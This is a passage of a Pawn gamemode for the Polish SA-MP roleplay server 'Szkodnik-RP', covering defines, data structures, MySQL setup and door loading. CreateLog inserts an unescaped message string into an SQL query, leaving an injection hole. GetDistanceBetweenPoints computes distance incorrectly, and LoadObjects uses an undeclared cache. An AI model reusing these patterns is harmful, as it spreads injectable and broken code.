#include <a_samp>
//#include <YSI_Visual\y_commands>
#include <streamer>
#include <sscanf2>
#include <Pawn.CMD>
#include <a_mysql>
#include <samp_bcrypt>


#include "db_schema.inc"

main(){}

#undef MAX_PLAYERS
#define MAX_PLAYERS 1000


// mysql settings



#define COL_AC_CHAT 0x42D95EFF

#define DEV_MODE 1

// defines dialogs
#define D_LOGIN 0
#define D_NOTFOUND 1
#define D_CREATE 2
#define D_FIND 3
#define D_AMMO 4
#define D_PASS 5
#define D_ADMINS 6
#define D_INFO 7
#define D_CREATEDOOR 8
#define D_ITEMS 9
#define D_ITEM_OPTIONS 10
#define D_NEARBY_ITEMS 11
#define D_USE_WEAP 12
#define D_PHONE 13
#define D_SMS 14
#define D_MESSAGES 15
#define D_CALL 16
#define D_ANSWER 17
#define D_CONTACTS 18
#define D_FRIENDS 19
#define D_ADD_CONTACT 20
#define D_REMOVE_CONTACT 21
#define D_911_NUMBERS 22
#define D_VCARD 23
#define D_VCARD_ACCEPT 24
#define D_STATS 25
#define D_ZONE 26
#define D_SERVICES 27
#define D_CREATE_GROUP 28
#define D_USERS 29
#define D_SETTINGS 30
#define D_CHANGE_PASS 31
#define D_ANIMS 32
#define D_DOOR_SETTINGS 33
#define D_BOOMBOX 34
#define D_CHANGE_URL 35
#define D_CHANGE_DOOR_NAME 36
#define D_HELP 37
#define D_COMMANDS 38
#define D_CMDS_OBJECT 39
#define D_DOOR_GROUP 40
#define D_DOOR_COST 41
#define D_CHANGE_GROUP_NAME 42
#define D_GROUP_PANEL 43
#define D_GROUP_KICK 44
#define D_CHANGE_PERMS 45
#define D_CHANGEPERMS 46
#define D_JOIN_GROUP 47
#define D_CHANGE_GROUP_COLOR 48
#define D_VEHICLES 49
#define D_WITHDRAW 50
#define D_DEPOSIT 51
#define D_ATM 52
#define D_ADMIN_DOOR 53
#define D_V_OPTIONS 54
#define D_TRADE 55
#define D_TRADE_2 56
#define D_TRADE_3 57
#define D_V_NEAR_PLAYERS 58
#define D_GOVERMENT 59
#define D_BANK 60
#define D_DOCUMENTS 61
#define D_VEHICLE_GROUP 62
#define D_BAG 63
#define D_BAGS 64
#define D_CONNECT 65
#define D_BUY_REGISTER 66
#define D_MEDIC 67
#define D_ALLUSERS 68
#define D_ALLGROUPS 69
#define D_GROUP_MEMBERS 70
#define D_GROUP_OPTIONS 71
#define D_MANAGE_MEMBER 72
#define D_GROUP_MEMBER_PERMS 73
#define D_GROUP_VEHICLES 74
#define D_BUS 75
#define D_MAKEBUS 76
#define D_OBJECTGROUP 77
#define D_SIM 78
#define D_SETANIM 79
#define D_PLAYER_CONTACTS 80
#define D_NEW_CONTACT 81
#define D_911 82
#define D_APP 83
#define D_APPS 84
#define D_OOC_NAME 85
#define D_DOOR_VW 86
#define D_ADOOR_CHANGE_NAME 87
#define D_INTERRACT_PLAYER 88
#define D_ACTION_OFFER 89
#define D_SERVER_SETTINGS 90
#define D_CONFIRM_POS 91
#define D_MAGAZINE 92
#define D_PRODUCTS 93
#define D_STACK 94
#define D_GROUP_PRODUCTS 95
#define D_V_OFFER 96
#define D_V_SELL 97
#define D_GROUP_ITEMS 98
#define D_ACCEPT_GROUP_ITEM 99
#define D_24 100
#define D_GROUP_PAYDAY 101
#define D_MEMBER_PAYDAY 102
#define D_CLOTCHES 103
#define D_NEARBY_PLAYERS 104
#define D_ACCEPT_ITEM 105
#define D_GROUP_AMOUNT_ITEM 106
#define D_PLAYER_REPORTS 107
#define D_PLAYER_REPORTS_OPTIONS 108
#define D_PLAYER_REPORTS_PENALTY 109
#define D_PLAYER_LOGS 110
#define D_PLAYER_ZONE_MANAGEMENT 111


#define LOG_TYPE_GAME_CONNECTION 0
#define LOG_TYPE_GAME_CHAT 1
#define LOG_TYPE_GAME_DMG 2
#define LOG_TYPE_GAME_VEHICLE 3
#define LOG_TYPE_GAME_CMDS 4
#define LOG_TYPE_GAME_ITEM 5
#define LOG_TYPE_GAME_CASH 6
#define LOG_TYPE_GAME_NICK 7
#define LOG_TYPE_GAME_POSITION 8
#define LOG_TYPE_WEAPON 9


#undef STREAMER_OBJECT_SD
#define STREAMER_OBJECT_SD 800

#define ATTACH_SLOT_WEAPON 6
#define ATTACH_SLOT_CASK 7
#define ATTACH_SLOT_MASK 8

#define DOOR_TYPE_HOUSE 0 
#define DOOR_TYPE_BUSINESS 1

#define UNRANKED 0
#define SP_1 1
#define SP_2 2
#define SP_3 3
#define GM 4
#define SGM 5
#define ADMIN 6
#define ADMINISTRATION 7
#define DEVELOPER 8

#define ITEM_STATE_EQ 0
#define ITEM_STATE_ONFOOT 1
#define ITEM_STATE_VEHICLE 2
#define ITEM_STATE_DESTROYED 3
#define ITEM_STATE_PHONE 4
#define ITEM_STATE_MAGAZINE 5
#define ITEM_STATE_DRIVING 6
#define ITEM_STATE_PRODUCT 7
#define ITEM_STATE_LIST 8

new bool:pGetPack[MAX_PLAYERS];

#define PARTY 0
#define LSPD 1
#define LSMC 2
#define RESTAURANT 3
#define GANG 4
#define MOTO_GANG 5
#define SAN_NEWS 6
#define SHOP_24_7 7
#define BANK 8
#define GOVERMENT 9
#define WORKSHOP 10
#define FUNITURE_SHOP 11
#define CLOTCHES_SHOP 12
#define HOTEL 13
#define CARS_SALOON 14
#define STRANGE_GROUP 15
#define FBI 16

#define HEX_WHITE "{FFFFFF}"
#define HEX_BLUE "{AAB0FF}"
#define HEX_RED "{FFA29C}"
#define HEX_GRAY "{CCCACC}"
#define HEX_YELLOW "{FFBE5E}"
#define HEX_BLACK "{000000}"
#define HEX_GREEN "{9FD18B}"
#define HEX_PURPLE "{8671C0}"
#define HEX_DARKRED "{FF3C3A}"

#define COLOR_RED 0xFFA29CFF
#define COLOR_BLUE 0xAAB0FFFF
#define COLOR_WHITE 0xF7F7F8FF
#define COLOR_GRAY 0xA6A4A7FF
#define COLOR_ORANGE 0xFFA138FF
#define COLOR_PINK 0xFFC3FFFF
#define COLOR_YELLOW 0xFFCC00FF
#define COLOR_LYELLOW 0xFFFF64FF
#define COLOR_GREEN 0x77C772FF
#define COLOR_BLACK 0x00000000
#define COLOR_DARKRED 0xD72D32FF

#define CHAT_SHADE_1 0xEEEEEEFF
#define CHAT_SHADE_2 0xC8C8C8FF
#define CHAT_SHADE_3 0xB4B4B4FF
#define CHAT_SHADE_4 0x8C8C8CFF
#define CHAT_SHADE_5 0x514F56FF
#define CHAT_SHADE_6 0x302D33FF

#define ME_SHADE_1 0xC5A9D2FF
#define ME_SHADE_2 0xB097CAFF
#define ME_SHADE_3 0xB08DC2FF
#define ME_SHADE_4 0xB08DB8FF
#define ME_SHADE_5 0xA184B0FF
#define ME_SHADE_6 0xA184A9FF

#define DO_SHADE_1 0xB39CEDFF
#define DO_SHADE_2 0xA292D6FF
#define DO_SHADE_3 0xA292CAFF
#define DO_SHADE_4 0x9892C5FF
#define DO_SHADE_5 0x9883C5FF
#define DO_SHADE_6 0xA697D4FF

// Spawn states

#define SPAWN_OR_HOUSE 0
#define LAST_POSITION 1
#define ADMINJAIL 2

#define FIRST_MALE_SKIN 7
#define FIRST_FEMALE_SKIN 12

#define LAST_MALE_SKIN 300
#define LAST_FEMALE_SKIN 211

#define PLAYER_NORMAL_COLOR 0xFFFFFF88
#define LOGGED_COLOR 0xB4B4B400
#define UNLOGGED_COLOR 0x00000000

#define DAMAGE_COLOR 0xED444788
#define DESC_COLOR 0xB992C388

#define MAX_ZONES 600
#define ZONE_SIZE 100
#define MAX_DOORS 10000
#define MAX_ITEMS 10000
#define MAX_MESSAGES 10000
#define MAX_CONTACTS 10000
#define MAX_GROUPS 10000
#define MAX_TEXTURES 50000
#undef MAX_OBJECTS
#define MAX_OBJECTS 50000
#undef MAX_VEHICLES
#define MAX_VEHICLES 50000
#undef MAX_ACTORS
#define MAX_ACTORS 1000

#define MAX_APPS 10000

#define MAX_ANIMS 100

new Float:pGlobalX[MAX_PLAYERS], Float:pGlobalY[MAX_PLAYERS], Float:pGlobalZ[MAX_PLAYERS];

enum E_SERVER
{
	Float:magazinePosX,
	Float:magazinePosY,
	Float:magazinePosZ
};

new bool:pShowingWeapon[MAX_PLAYERS];



new ServerSettings[E_SERVER];

new PlayerText:PlayerAction[MAX_PLAYERS];

new PlayerActionTimer[MAX_PLAYERS];

new Text3D:pText[MAX_PLAYERS];

new pDetonatorUID[MAX_PLAYERS];

new pCommandCount[MAX_PLAYERS];

new pMessageCount[MAX_PLAYERS];

new pMapIcon[MAX_PLAYERS];

// wc is a shortcut from "weapon cache".
enum E_WEAPON
{
	wcUID,
	wcVal,
	wcVal2,
	wcVal3,
	wcVal4
};

new WeaponCache[MAX_PLAYERS][E_WEAPON];

enum E_OBJECT
{
	oUID,
	oID,
	Float:oX,
	Float:oY,
	Float:oZ,
	Float:orX,
	Float:orY,
	Float:orZ,
	oOwner,
	oOwnerType,
	oModel,
	oGate
};

new ObjectCache[MAX_PLAYERS][E_OBJECT];

new bool:pCantClearAnim[MAX_PLAYERS];

new pDoorUID[MAX_PLAYERS];

// Training

new pTrainingTimer[MAX_PLAYERS];

new pTrainingState[MAX_PLAYERS];

new pTrainingExtrude[MAX_PLAYERS];

new pHoldingBar[MAX_PLAYERS];

#define TRAINING_STATE_NONE 0
#define TRAINING_STATE_UP 1
#define TRAINING_STATE_DOWN 2
#define TRAINING_STATE_DONE 3

enum E_APP
{
	appID,
	appOwner,
	appText[128],
	Float:appX,
	Float:appY,
	Float:appZ,
	appVW,
	appState,
	appPlayerUID,
	appPhone
};

new AppCache[MAX_APPS][E_APP];

new bool:pPriv[MAX_PLAYERS];


new tVal[MAX_PLAYERS];
new tVal2[MAX_PLAYERS];
new tVal3[MAX_PLAYERS];



new bool:pBus[MAX_PLAYERS];

enum E_ANIM
{
	aName[32],
	aLib[32],
	bool:aRepeat,
	aCustomName[32],
	bool:aFreeze,
	aLockX,
	aLockY,
	aTime
};

new AnimList[MAX_ANIMS][E_ANIM];

new pPage[MAX_PLAYERS];

enum E_NICK
{
	Text3D:nID,
	nStr[525],
	nColor
};

new pNick[MAX_PLAYERS][E_NICK];

new pPickupUID[MAX_PLAYERS];

enum E_DESC
{
	Text3D:dID,
	bool:dIsDescOnPlayer
};

new pDesc[MAX_PLAYERS][E_DESC];

new PlayerText:TextDrawDoorInfo[MAX_PLAYERS];

new PlayerText:BWTextDraw[MAX_PLAYERS];

new bool:pFreeze[MAX_PLAYERS];

enum E_VEHICLE
{
	vUID,
	vID,
	vColor,
	vColor2,
	vPlayerUID,
	vGroupUID,
	Float:vPosX,
	Float:vPosY,
	Float:vPosZ,
	Float:vAngle,
	vVW,
	vFuel,
	vModel,
	Float:vHP,
	vOpen,
	vRegister,
	vSiren,
	vBanReason[128],
	vBanCost,
	Float:vMileAge,
	vTimer,
	vEngine,
	vLights,
	vDoors,
	vBoot,
	vBonnet,
	vAlarm,
	vObjective
}

enum E_DOOR
{
	dUID,
	dName[32],
	dType,
	Float:dInsX,
	Float:dInsY,
	Float:dInsZ,
	Float:dOutX,
	Float:dOutY,
	Float:dOutZ,
	dInsVW,
	dOutVW,
	dPlayerUID,
	dGroupUID,
	dDestroyed,
	dOpen,
	dUrl[256],
	dEnterCost,
	dVehicle,
	bool:dAlarm,
	bool:dPlayingAlarm,
	dExplodeTime,
	Float:dFacingAngle
};



new bool:AreObjectsLoaded;


enum E_REGISTER
{
	rSex,
	rName[MAX_PLAYER_NAME],
	rBornDate
};

new RegisterCache[MAX_PLAYERS][E_REGISTER];

new PlayerText:BottomTextDraw[MAX_PLAYERS];
new PlayerText:RadarTextDraw[MAX_PLAYERS];
new RadarTextDrawTimer[MAX_PLAYERS];
new DoorInfoTextTimer[MAX_PLAYERS];

new ChooseSkinTimer[MAX_PLAYERS];


new Text:GlobalLogo;
new Text:RadioTextDraw;
new ClearNicknameColorTimer[MAX_PLAYERS];
new Text:PenalityTextDraw;
new PlayerText:AJTextDraw[MAX_PLAYERS];

new bool:pLogged[MAX_PLAYERS];

// detonator
new pDetonatorTime[MAX_PLAYERS];
new pDetonatorTimer[MAX_PLAYERS];

new pGPSTimer[MAX_PLAYERS];

enum E_ZONE
{
	Float:zMinX,
	Float:zMinY,
	Float:zMaxX,
	Float:zMaxY,
	zID,
	zYard,
	zCostH,
	zCostB,
	zName[64]
};

new bool:pBelts[MAX_PLAYERS];

new ZoneData[MAX_ZONES][E_ZONE];

new LastdUID;



new dPickupID[MAX_PICKUPS];

new PlayerMessageUID[MAX_PLAYERS];

enum E_ITEM
{
	iUID,
	iType,
	iVal,
	iVal2,
	iVal3,
	iVal4,
	iName[128],
	iState,
	Float:iX,
	Float:iY,
	Float:iZ,
	iVW,
	iOwner,
	iActive,
	Float:iAttachX,
	Float:iAttachY,
	Float:iAttachZ,
	Float:iAttachrX,
	Float:iAttachrY,
	Float:iAttachrZ,
	Float:iSizeX,
	Float:iSizeY,
	Float:iSizeZ,
	iGroupUID,
	iCost
};
new ItemCache[MAX_ITEMS][E_ITEM];

enum E_CALL
{
	cCaller,
	cCalling
};
new CallData[MAX_PLAYERS][E_CALL];

new LastContactUID;

enum E_CONTACT
{
	cNum,
	cOwner,
	cName[128],
	cState
};

new ContactCache[MAX_CONTACTS][E_CONTACT];




new ghour, gmin, gsec, gmsg[128];

new PlayerText:Group[MAX_PLAYERS];
new PlayerText:Group2[MAX_PLAYERS];
new PlayerText:Group3[MAX_PLAYERS];
new PlayerText:GroupLabel[MAX_PLAYERS];

new bool:pTeleport[MAX_PLAYERS];

new pCalling[MAX_PLAYERS];
new pTalking[MAX_PLAYERS];
new CallingTimer[MAX_PLAYERS];

enum E_GROUP
{
	gUID,
	gType,
	gName[32],
	gBank,
	bool:gChatIC,
	bool:gChatOOC,
	gColor[16],
	gState,
	gVehicleLimit,
	gPayDay
};

enum E_GROUP_MEMBER{
	gmUID,
	bool:gmIsMapper,
	bool:gmCanInvite,
	bool:gmIsAdmin,
	bool:gmDoorAccess, 
	bool:gmVehicleAccess,	
	bool:gmProductsAccess,
	gmPayday,
	gmDuty,
	gmReward,
	gmMapper
}

enum E_PLAYER_GROUP{
	group[E_GROUP],
	memberInfo[E_GROUP_MEMBER]
}

new GroupCache[MAX_GROUPS][E_GROUP];

#define MAX_PLAYER_GROUPS 8

enum E_PLAYER
{
	pUID,
	pHash[64+1],
	pSalt[10+1], 
	pName[24], 
	pGender,
	pSkin,
	Float:pHealth,
	pCash,
	pTutorialLevel,
	pStrenght, 
	pLevel,
	pBW_Time,
	pBW_Reason,
	pAJ_Time,
	pPlayTime, 
	pScore,
	pHouseSpawn, 
	pBank,
	pBornDate,
	pPosVW, 
	Float:pPosX,
	Float:pPosY,
	Float:pPosZ,
	pID_Card,
	pDrivingLicense,
	pBankAccount,
	pOOC,
	pGroupReward, 
	pGroupReward2,
	pGroupReward3,
	pFavAnim[16],
	pJailTime,
	Float:pJailX, 
	Float:pJailY, 
	Float:pJailZ, 
	pJailVW,
	pLastTraining,
	pObjectEditor,
	pGymBoostTime,
	// not related to database
	pCurrentVehicle[E_VEHICLE],
	pCurrentDoor[E_DOOR],
	pLastUpdateTime,
	PlayerText:pGroupTxd[MAX_PLAYER_GROUPS]
};


	//pGroups[MAX_PLAYER_GROUPS][E_PLAYER_GROUP],

new PlayerCache[MAX_PLAYERS][E_PLAYER];

new LastgUID;

new pChoosingTxd[MAX_PLAYERS];

new pDuty[MAX_PLAYERS];

new PlayerText:DutyTxd[MAX_PLAYERS];

new PlayerText:ObjectInfo[MAX_PLAYERS];

new pLast[MAX_PLAYERS];


enum E_TEXTURE
{
	tTexturename[128],
	tTxdname[128],
	tColor,
	tModelid,
	tObjectUID,
	tIndex,
	tMaterialsize,
	tFontsize,
	tBold,
	tBackcolor,
	tAlignment,
	tType
};

//new TextureCache[MAX_TEXTURES][E_TEXTURE];

new LoginAttempt[MAX_PLAYERS];

new PlayerText:VehicleInfo[MAX_PLAYERS];

new LastvUID;

new VehicleMapIcon[MAX_VEHICLES];



new MapIcon[MAX_PLAYERS];
new MapIconTimer[MAX_PLAYERS];

new ObjectInfoTimer[MAX_PLAYERS];
new aduty[MAX_PLAYERS];

new LastaUID;

new pAFK[MAX_PLAYERS];

enum E_ACTOR
{
	aUID,
	aID,
	aSkin,
	aAnimLib[32],
	aAnimName[32],
	aType,
	aName[64],
	Float:aPosX,
	Float:aPosY,
	Float:aPosZ,
	aVW,
	Float:aAng,
	Text3D:aLabel,
	aRepeat,
	aText[256]
};

new ActorCache[MAX_ACTORS][E_ACTOR];

enum E_ACTION
{
	aType
};

new ActionData[MAX_PLAYERS][E_ACTION];

enum E_DIALOG
{
	dialogVal,
	dialogVal2,
	dialogVal3
}

new PumpUpTheJam[MAX_PLAYERS];

new dialogCache[MAX_PLAYERS][E_DIALOG];

new pVal[MAX_PLAYERS];
new pVal2[MAX_PLAYERS];

enum E_REPAIR
{
	repairTimer,
	repairTime,
	repairVehicleID
}

new PlayerRepairingVehicle[MAX_PLAYERS][E_REPAIR];

new pTick[MAX_PLAYERS];

new gyear, gmonth, gday;

new bool:ac[MAX_PLAYERS];

new bool:pChangeInterior[MAX_PLAYERS];

new godmodecount[MAX_PLAYERS];

new Attacker[MAX_PLAYERS];

new bool:pEnteringCar[MAX_PLAYERS];

new bool:pCuffed[MAX_PLAYERS];

new pCuffedTimer[MAX_PLAYERS];

new pWasInCar[MAX_PLAYERS];




forward db_timer();
public db_timer(){

	DB_HANDLE = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DB);
	if(mysql_errno() != 0){

		printf(">>> Wystapil blad w probie polaczenia z baza danych, kod bledu: %d", mysql_errno());
		SetTimer("db_timer", 2000, false);
	}
	else{
		LoadGameMode();
		print(">>> Pomyslnie nawiazano polaczenie z baza danych.");
	}
}

public OnGameModeInit()
{
	print("Rozpoczynam ³adowanie Szkodnik-RP");
	DB_HANDLE = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DB);
	if(mysql_errno() != 0) {
		SetTimer("db_timer", 2000, false);
		printf(">>> Wystapil blad w probie polaczenia z baza danych, kod bledu: %d", mysql_errno());
		
	}
	else{
		print(">>> Pomyslnie nawiazano polaczenie z baza danych.");

		LoadGameMode();

	}


	
	return 1;
}

forward LoadGameMode();
public LoadGameMode(){
	EnsureCreated();
		
	CreateTextDraws();

	AddAnimations();
	SendRconCommand("hostname ••• Szkodnik RolePlay •••");
	SendRconCommand("gamemodetext Szkodnik-RP v2.2");
	SendRconCommand("mapname Los Santos");
	gettime(ghour, gmin, gsec);
	SetWorldTime(ghour);
	
	EnableStuntBonusForAll(0);
	DisableInteriorEnterExits();
	ManualVehicleEngineAndLights();
	ShowNameTags(0);



	LoadGroups();
	LoadDoors();

	LoadTextures();

	LoadActors();
	LoadApps();
	// LoadZones();


	SetTimer("min_timer", 1000*60, true);
}

#define DOC_TYPE_ID 0
#define DOC_TYPE_DRIVING_LICENSE 1
#define DOC_TYPE_INSANITY 2
#define DOC_TYPE_SANITY 3
#define DOC_TYPE_FISHING_RIGHT 4
#define DOC_TYPE_NO_CRIMINAL_RECORD 5

forward HasPlayerDoc(playerid, docType);
public HasPlayerDoc(playerid, docType){
	new query[128];
	format(query, sizeof(query), "SELECT playerUID FROM playerDocs WHERE playerUID = %d AND type = %d;", PlayerCache[playerid][pUID], docType);
	new Cache:cache = mysql_query(DB_HANDLE, query);
	new rows = cache_num_rows();
	cache_delete(cache);
	return rows;
}

stock GivePlayerDoc(playerid, docType){
	new query[256];
	
	format(query, sizeof(query), "INSERT INTO playerDocs (playerUID, type) VALUES (%d, %d);", PlayerCache[playerid][pUID], docType);
	mysql_query(DB_HANDLE, query, false);
}



stock RemovePlayerDoc(playerid, docType){
	new query[256];
	format(query, sizeof(query), "DELETE FROM playerDocs WHERE playerUID=%d AND type=%d",PlayerCache[playerid][pUID], docType);
	mysql_query(DB_HANDLE, query, false);
}

stock CreateLog(logType, playerid, const message[], anyUID=0){
	new query[256];
	format(query, sizeof(query), "INSERT INTO playerLogs (type, playerUID, message, anyUID) VALUES (%d, %d, '%s', %d);", logType, PlayerCache[playerid][pUID], message, anyUID);
	mysql_query(DB_HANDLE, query, false);
}

public OnGameModeExit()
{
	mysql_close();
	printf(">>> Serwer zostal wylaczony.");
	return 1;
}

stock ActorPath(actoruid)
{
	new path[128];
	format(path, sizeof(path), FOLDER_ACTORS"%d.ini", actoruid);
	return path;
}

stock GetVehicleSpeed(vehicleid)
{
	new speed;
	new Float:X, Float:Y, Float:Z;
	GetVehicleVelocity(vehicleid, X, Y, Z);
	X = X*X*100;
	Y = Y*Y*100;
	Z = Z*Z*100;
	speed = floatround(X+Y+Z);
	return speed*2;
}

stock GetPlayerSpeed(playerid)
{
	new speed;
	new Float:X, Float:Y, Float:Z;
	GetPlayerVelocity(playerid, X, Y, Z);
	X = X*X*100;
	Y = Y*Y*100;
	Z = Z*Z*100;
	speed = floatround(X+Y+Z);
	return speed;
}

stock GetPlayerGroundSpeed(playerid)
{
	new speed;
	new Float:X, Float:Y, Float:Z;
	GetPlayerVelocity(playerid, X, Y, Z);
	X = X*X*100;
	Y = Y*Y*100;
	speed = floatround(X+Y);
	return speed;
}

stock GetPlayerHighSpeed(playerid)
{
	new speed;
	new Float:X, Float:Y, Float:Z;
	GetPlayerVelocity(playerid, X, Y, Z);
	Z = Z*Z*100;
	speed = floatround(Z);
	return speed;
}

stock Float:GetDistanceBetweenPoints(Float:X, Float:Y, Float:Z, Float:X2, Float:Y2, Float:Z2)
{
	new Float:distance;
	distance = X-X2 + Y-Y2 + Z-Z2;
	if(distance < 0.0)
	distance *= -1;
	return distance;
}


stock ObjPath(id)
{
	new path[64];
	format(path, sizeof(path), FOLDER_OBJECTS"%d.ini", id);
	return path;
}

stock TexturePath(textureid)
{
	new path[64]; format(path, sizeof(path), FOLDER_TEXTURES"%d.ini", textureid);
	return path;
}

stock LoadTextures()
{
	/*Cache:result = mysql_query(MySQL, "SELECT * FROM textures");
	cache_get_value_int(0, 0, registered_players);
	printf("There are %d players in the database.", registered_players);
	cache_delete(result);
	cache_get_value_name_int(0, const column_name[], destination)
	mysql_query(DB_HANDLE, );

	mysql_store_result();

	new data[1024],
	texturename[128],
	txdname[128],
	objectUID,
	modelid,
	color,
	index,
	type,
	fontsize,
	bold,
	backcolor,
	alignment,
	materialsize,
	objectid;

	while(mysql_fetch_row(data))
	{
		sscanf(data, "p<|>s[128]s[128]iiiiiiiiiii",
		texturename,
		txdname,
		objectUID,
		modelid,
		color,
		index,
		type,
		fontsize,
		bold,
		backcolor,
		alignment,
		materialsize,
		objectid);

		switch(type)
		{
			case 0: SetDynamicObjectMaterial(objectid, index, modelid, txdname, texturename,color);
			case 1: SetDynamicObjectMaterialText(objectid, index, texturename, materialsize, txdname, fontsize, bold, color, backcolor, alignment);
		}
	}

	printf(">>> Loaded %d textures.", mysql_num_rows());

	cache_delete(cache);*/
}

stock SaveTextures()
{
	/*new count;
	for(new i; i<LasttUID; i++)
	{
		if(TextureCache[i][tObjectUID] == 0 && ObjectCache[TextureCache[i][tObjectUID]][oState] == 0)
		{
			continue;
		}
		if(!dfile_FileExists(TexturePath(i)))
		dfile_Create(TexturePath(i));
		dfile_Open(TexturePath(i));
		dfile_WriteInt("Color", TextureCache[i][tColor]);
		dfile_WriteInt("Modelid", TextureCache[i][tModelid]);
		dfile_WriteInt("ObjectUID", TextureCache[i][tObjectUID]);
		dfile_WriteString("Txdname", TextureCache[i][tTxdname]);
		dfile_WriteString("Texturename", TextureCache[i][tTexturename]);
		dfile_WriteInt("Index", TextureCache[i][tIndex]);
		dfile_WriteInt("Materialsize", TextureCache[i][tMaterialsize]);
		dfile_WriteInt("Fontsize", TextureCache[i][tFontsize]);
		dfile_WriteInt("Type", TextureCache[i][tType]);
		dfile_WriteInt("Backcolor", TextureCache[i][tBackcolor]);
		dfile_WriteInt("Alignment", TextureCache[i][tAlignment]);
		dfile_SaveFile();
		dfile_CloseFile();
		count++;
	}
	printf(">>> Saved %d textures.", count);*/
	return 1;
}

stock SaveObjects()
{
	/*new count;
	for(new i; i<MAX_OBJECTS; i++)
	{
		if(ObjectCache[i][oUID] == 0)
		return printf("ERROR: Invalid saving object UID. Saving canceled.");
		if(!dfile_FileExists(ObjPath(i)))
		dfile_Create(ObjPath(i));
		dfile_Open(ObjPath(i));
		dfile_WriteInt("UID", ObjectCache[i][oUID]);
		dfile_WriteInt("State", ObjectCache[i][oState]);
		dfile_WriteFloat("X", ObjectCache[i][oX]);
		dfile_WriteFloat("Y", ObjectCache[i][oY]);
		dfile_WriteFloat("Z", ObjectCache[i][oZ]);
		dfile_WriteFloat("rX", ObjectCache[i][orX]);
		dfile_WriteFloat("rY", ObjectCache[i][orY]);
		dfile_WriteFloat("rZ", ObjectCache[i][orZ]);
		dfile_WriteInt("Model", ObjectCache[i][oModel]);
		dfile_WriteInt("VW", ObjectCache[i][oVW]);
		dfile_WriteInt("Gate", ObjectCache[i][oGate]);
		dfile_WriteFloat("GateX", ObjectCache[i][oGateX]);
		dfile_WriteFloat("GateY", ObjectCache[i][oGateY]);
		dfile_WriteFloat("GateZ", ObjectCache[i][oGateZ]);
		dfile_WriteFloat("GaterX", ObjectCache[i][oGaterX]);
		dfile_WriteFloat("GaterY", ObjectCache[i][oGaterY]);
		dfile_WriteFloat("GaterZ", ObjectCache[i][oGaterZ]);
		dfile_WriteInt("Owner", ObjectCache[i][oOwner]);
		dfile_WriteInt("OwnerType", ObjectCache[i][oOwnerType]);
		dfile_WriteString("Name", ObjectCache[i][oName]);
		dfile_SaveFile();
		dfile_CloseFile();
		if(ObjectCache[i][oState] == 0)
		count++;
	}
	printf(">>> Saved %d objects.", count);*/
	return 1;
}

forward CheckObjectsLoaded();
public CheckObjectsLoaded()
{
	if(!AreObjectsLoaded)
	{
		SetTimer("CheckObjectsLoaded", 1000, false);
	}
	else
	{
		
	}
}

stock LoadObjects()
{
	AreObjectsLoaded = false;

	SetTimer("CheckObjectsLoaded", 500, false);

	new data[1024], uid, model, Float:X, Float:Y, Float:Z, Float:rX, Float:rY, Float:rZ, VW, id;

	mysql_query(DB_HANDLE, "SELECT uid, model, X, Y, Z, rX, rY, rZ, VW FROM objects");

	mysql_store_result();

	while(mysql_fetch_row(data))
	{
		sscanf(data, "p<|>iiffffffi",
		uid,
		model,
		X,
		Y,
		Z,
		rX,
		rY,
		rZ,
		VW);

		id = CreateDynamicObject(model, X, Y, Z, rX, rY, rZ, VW, 0, -1);

		SetTimerEx("UpdateTableTextures", 1, false, "ii", id, uid);
	}

	printf(">>> Loaded %d objects", mysql_num_rows());

	cache_delete(cache);
	AreObjectsLoaded = true;
}

forward UpdateTableTextures(objectid, objectuid);
public UpdateTableTextures(objectid, objectuid)
{
	/*new query[256];

	format(query, sizeof(query), "UPDATE objects SET ID = '%d', timer = '0' WHERE uid = '%d' LIMIT 1", objectid, objectuid);
	mysql_query(DB_HANDLE, query);

	format(query, sizeof(query), "UPDATE textures SET ID = '%d' WHERE objectUID = '%d'", objectid, objectuid);
	mysql_query(DB_HANDLE, query);*/
}


stock GetMapIcon(grouptype)
{
	switch(grouptype)
	{
		 case 1: return 30;
		 case 2: return 22;
		 case 3: return 50;
		 case 6: return 48;
		 case 8: return 52;
		 case 9: return 40;
		 case 10: return 27;
		 case 11: return 37;
		 case 12: return 45;
		 case 13: return 31;
		 case 14: return 55;
		 case 15: return 54;
	}
	return 0;
}

new dPickupID2[MAX_DOORS];

stock LoadDoors()
{

	/*
		// Doors table
	mysql_query(DB_HANDLE, 
	"CREATE TABLE IF NOT EXISTS doors(\n\
	uid INT PRIMARY KEY AUTO_INCREMENT,\n\
	outVirtualWorld INT,\n\
	insVirtualWorld INT,\n\
	name VARCHAR(32) DEFAULT 'Drzwi',\n\
	url VARCHAR(256) DEFAULT '',\n\
	outX FLOAT,\n\
	outY FLOAT,\n\
	outZ FLOAT,\n\
	insX FLOAT,\n\
	insY FLOAT,\n\
	insZ FLOAT,\n\
	playerUID INT DEFAULT NULL,\n\
	groupUID INT DEFAULT NULL,\n\
	open INT DEFAULT 0,\n\
	type INT,\n\
	vehicle INT DEFAULT 0,\n\
	alarm INT DEFAULT 0,\n\
	explodeTime INT DEFAULT 0,\n\
	expirationDate DATETIME DEFAULT (CURRENT_DATE + INTERVAL 1 MONTH),\n\
	facingAngle FLOAT,\n\
	gameId INT DEFAULT 0);"
	,false);*/

	new Cache:cache = mysql_query(DB_HANDLE, "SELECT doors.uid as uid, groups.type as groupType, outX, outY, outZ, outVirtualWorld, doors.type, COALESCE(groupUID, 0) FROM doors LEFT OUTER JOIN groups ON groups.uid=doors.groupUID;");
	
	new rows = cache_num_rows();

	new Float:outX, Float:outY, Float:outZ, outVirtualWorld, type, groupUID, groupType, uid;
	

	for(new i=0; i<rows; i++){
		cache_get_value_name_float(i, "outX", outX);
		cache_get_value_name_float(i, "outY", outY);
		cache_get_value_name_float(i, "outZ", outZ);
		cache_get_value_name_int(i, "type", type);
		cache_get_value_name_int(i, "outVirtualWorld", outVirtualWorld);
		cache_get_value_name_int(i, "groupUID", groupUID);
		cache_get_value_name_int(i, "groupType", groupType);
		cache_get_value_name_int(i, "uid", uid);


		new pickupId = 0;

		switch(type){
			case DOOR_TYPE_HOUSE:{
				pickupId = CreateDynamicPickup(1273, 2, outX, outY, outZ, outVirtualWorld, 0, -1);
			}
			case DOOR_TYPE_BUSINESS:{
				if(groupUID){
					pickupId = CreateDynamicPickup(1273, 2, outX, outY, outZ, outVirtualWorld, 0, -1);
					CreateDynamicPickup(GetPickupModelFromGroupType(groupType), 2,  outX, outY, outZ, outVirtualWorld, 0, -1);
				}
				else
				{
